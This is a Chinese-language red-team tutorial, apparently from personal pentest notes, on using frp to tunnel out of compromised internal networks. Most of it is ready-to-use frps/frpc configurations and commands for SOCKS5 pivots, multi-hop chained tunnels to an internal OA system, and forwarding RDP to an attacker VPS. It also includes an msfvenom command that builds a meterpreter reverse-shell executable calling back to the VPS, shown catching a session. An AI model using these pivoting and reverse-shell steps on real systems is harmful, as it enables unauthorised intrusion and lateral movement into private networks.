# frp简介

frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。是一款开源软件，github地址：https://github.com/fatedier/frp

frp分为服务端(frps)和客户端(frpc)，客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网。frp小巧而且强大，具有诸多功能，这里我们只探讨内网渗透中的一些运用。

   

# 场景一：隧道

如下拓扑图，将we服务器作为代理，搭建黑客与数据库的socks5隧道。

<img src="../../../note/red/pictures/frp2.png" alt="frp1" style="zoom:33%;" /> 

### 服务端

vps上起一个frp服务端，

配置frps.ini：

```
[common]
bind_port = 7000
token = shadowtest	#密码
```

vps上执行frp server端。

```
./frps -c ./frps.ini
```



### 客户端

web服务器上起一个frp客户端

配置frpc.ini：

```
[common]
server_addr = vps-ip
server_port = 7000
token = shadowtest #密码
	
[vps]
type = tcp
plugin = socks5
remote_port = 4445
use_encryption = true #是否加密
```

如上配置将web服务器的socks流量映射到vps的4445端口。web服务器成了跳板机器，打通了黑客与数据库的隧道。

web服务器执行

```
./frpc -c ./frpc.ini
```



黑客攻击机本地配置代理

`vps-ip:4445`

在黑客的机器上通过输入数据库的内网地址，成功访问到了数据库的http服务。

<img src="../../../note/red/pictures/image-20201022100934029.png" alt="image-20201022100934029" style="zoom: 33%;" /> 



# 场景二：隧道多级串联

如下拓扑图，将web服务器和数据库都作为代理，搭建黑客访问oa系统socks5隧道。

<img src="../../../note/red/pictures/frp1.png" alt="frp1" style="zoom:33%;" /> 

### vps配置

vps上起一个frp的服务端

frps.ini：

```
[common]
bind_port = 7000
token = shadowtest	#密码
```

执行：

```
./frps -c ./frps.ini
```



### web服务器配置

web服务器要开一个frp客户端和一个服务端。客户端的本地端口监听4445端口，然后将4445端口监听的流量映射到vps的4445端口，完成端口转发。

**服务端**

服务端frps.ini的配置：

```
[common]
bind_port = 7000
token = shadowtest	#密码
```

执行frps

```
./frps -c ./frps.ini
```

**客服端**

在web服务器上添加frpc.ini的配置，这里需要注意不能添加socks5插件。

```
[common]
server_addr = vps-ip
server_port = 7000
token = shadowtest
	
[vps]
type = tcp
remote_port = 4445	#映射到vps的端口
local_port = 4445		#数据库系统要连接的端口
use_encryption = true
```

执行

```
./frps -c ./frps.ini
```



### 数据库系统配置

在数据库上添加frpc.ini的配置，这里需要socks5插件。这里frp客户端将数据库的socks流量映射到web服务器的4445端口，web服务器监听4445的流量并将流量转发到vps的4445端口，所以web服务器和数据库机器都成了跳板机，打通了黑客与oa系统的隧道。

```
[common]
server_addr = WebServer-ip
server_port = 7000
token = shadowtest #密码
	
[webserver]
type = tcp
plugin = socks5
remote_port = 4445
use_encryption = true #是否加密
```

执行

```
./frpc -c ./frpc.ini
```

我们还是配置黑客本地代理为vps-ip:4445

在浏览器输入oa系统的ip地址：10.37.133.4

成功访问到oa系统的http服务：

<img src="../../../note/red/pictures/image-20201022100803364.png" alt="image-20201022100803364" style="zoom: 33%;" /> 



# 场景三：frp代理本地msf

还是场景一的拓扑图，本地装有metasploit，通过本地的meatsploit来直接控制web服务器，而不需要将metasploit装到vps上。

局域网攻击机 <——> vps <——> 局域网靶机

<img src="../../../note/red/pictures/frp2.png" alt="frp1" style="zoom: 33%;" /> 

### vps配置

vps启也个frp的服务端

frps.ini:

```
[common]
bind_port = 7000
token = shadowtest
```

启动

```
./frps -c ./frps.ini
```



### 本地msf配置

本机启动一个frp的客户端，监听本机5555端口的流量，并映射到vps的4445端口。

```
[common]
server_addr = vps-ip
server_port = 7000
token = shadowtest
	
[vps]
type = tcp
local_ip = 127.0.0.1
local_port = 5555	#本地监听端口
remote_port = 4445 #将本地5555端口流量映射到vps4445端口
```

用msf生成远控，端口对应攻击机设置的remote_port

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=vps-ip lport=4445 -f exe >  frpmsf.exe
```

本地攻击机监听，端口配置攻击机local_port

<img src="../../../note/red/pictures/image-20201022101844646.png" alt="image-20201022101844646" style="zoom: 50%;" /> 

靶机执行msf远控，成功接收到了meterpreter

<img src="../../../note/red/pictures/image-20201022102051831.png" alt="image-20201022102051831" style="zoom:50%;" /> 





# 场景四：端口转发

如下图，将oa系统的3389端口转发出来，直接通过黑客的机器连接3389端口。

<img src="../../../note/red/pictures/frp1.png" alt="frp" style="zoom: 33%;" /> 



### oa系统配置

oa系统配置frp客户端，将oa系统自己的3389端口映射到数据系统的4445端口

frpc.ini:

```
[common]
server_addr = 10.37.133.3 #数据库-ip
server_port = 7000
token = shadowtest
	
[rdp]
type = tcp
remote_port = 4445
local_port = 3389
use_encryption = true
```

执行

```
.\frp.exe -c .\frpc.ini
```



### 数据库系统

数据库系统配置一个frp服务端和一个客户端，服务端用来接收oa系统的流量，客户端转发oa系统的流量。

**服务端**

```
[common]
bind_port = 7000
token = shadowtest
```

执行

```
./frps -c ./frps.ini
```



**客户端**

```
[common]
server_addr = 10.37.132.5 #web服务器ip
server_port = 7000
token = shadowtest
	
[rdp]
type = tcp
remote_port = 4445
local_port = 4445
use_encryption = true
```

执行

```
./frpc -c ./frpc.ini
```



### web服务器配置

web服务器还是将接收到的4445端口流量转发到vps的4445端口流量。

**服务端**

```
[common]
bind_port = 7000
token = shadowtest	#密码
```

**客户端**

```
[common]
server_addr = 10.37.129.8 #vps-ip
server_port = 7000
token = shadowtest
	
[rdp]
type = tcp
remote_port = 4445
local_port = 4445
use_encryption = true
```



### vps配置

vps启一个frps监听就好了

```
[common]
bind_port = 7000
token = shadowtest	#密码
```



一切都运行好后，直接访问vps-ip:4445(10.37.129.8:4445)相当于访问oa-ip:3389(10.37.133.4:3389)。

成功连上。

<img src="../../../note/red/pictures/image-20201022162315839.png" alt="image-20201022162315839" style="zoom: 33%;" /> 







